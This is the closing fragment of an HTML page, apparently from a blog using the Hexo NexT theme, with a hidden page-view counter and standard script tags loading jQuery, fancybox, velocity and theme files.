    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
